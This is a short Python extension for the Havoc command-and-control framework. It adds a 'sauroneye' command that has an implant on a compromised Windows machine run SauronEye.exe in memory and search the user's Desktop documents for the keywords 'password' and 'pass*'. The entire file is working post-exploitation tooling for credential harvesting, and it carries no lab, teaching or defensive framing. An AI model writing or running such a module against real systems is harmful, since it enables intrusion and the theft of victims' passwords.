#!/usr/bin/env python
# Author : Cipher007

from havoc import Demon, RegisterCommand, RegisterModule

def passwords( demonID, *param):
    TaskID : str = None
    demon : Demon = None

    query = '-d C:\\Users\\cipher\\Desktop\\ --filetypes .txt .doc .docx .xls .xml --contents --keywords password pass* -v'

    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to search for files containing passwords in C:\\Users" )

    demon.Command( TaskID, "dotnet inline-execute /home/cipher/Github/havoc-SauronEye/SauronEye.exe %s" % query)

    return TaskID

RegisterModule( "sauroneye", "Search tool to find files contatining specific keywords", "", "", "", "")
RegisterCommand( passwords, "sauroneye", "passwords", "Get passwords from a specific directory", 0, "", "")

